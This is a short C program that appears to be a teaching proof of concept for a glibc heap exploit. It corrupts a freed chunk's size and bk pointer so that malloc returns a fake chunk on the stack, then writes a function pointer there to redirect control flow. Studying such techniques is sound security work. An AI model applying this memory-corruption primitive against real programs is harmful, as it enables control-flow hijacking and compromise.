#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

void jackpot(){ fprintf(stderr, "Nice jump d00d\n"); exit(0); }

int main() {
	intptr_t* victim = malloc(0x80);
	fprintf(stderr, "malloc the victim chunk: %p\n\n", victim);

	/*
	int *t[10], i;					// tcache
	for (i = 0; i < 7; i++) {
		t[i] = malloc(0x80);
	}
	for (i = 0; i < 7; i++) {
		free(t[i]);
	} */

	malloc(0x10);

	intptr_t* buf[4] = {0};
	buf[1] = (intptr_t*)(0x80 + 0x10);
	buf[3] = (intptr_t*)buf;
	fprintf(stderr, "fake chunk on the stack: %p\n", buf);
	fprintf(stderr, "size: %p, bk: %p (any writable address)\n\n", buf[1], buf[3]);

	free(victim);
	fprintf(stderr, "free the victim chunk, it will be inserted in the unsorted bin\n");
	fprintf(stderr, "size: %p, fd: %p, bk: %p\n\n", (void *)victim[-1], (void *)victim[0], (void *)victim[1]);

	victim[-1] = 0x40;
	victim[1] = (intptr_t)buf;
	fprintf(stderr, "now overwrite the victim size (different from the next request) and bk (fake chunk)\n");
	fprintf(stderr, "size: %p, fd: %p, bk: %p\n\n", (void *)victim[-1], (void *)victim[0], (void *)victim[1]);

	/* 
	for (i = 0; i < 7; i++) {		// tcache
		t[i] = malloc(0x80);
	} */

	char *p1 = malloc(0x80);
	fprintf(stderr, "malloc(0x80): %p (fake chunk)\n\n", p1);

	intptr_t sc = (intptr_t)jackpot;
	memcpy((p1+0x28), &sc, 8);		// 	memcpy((p1+0x78), &sc, 8);
}
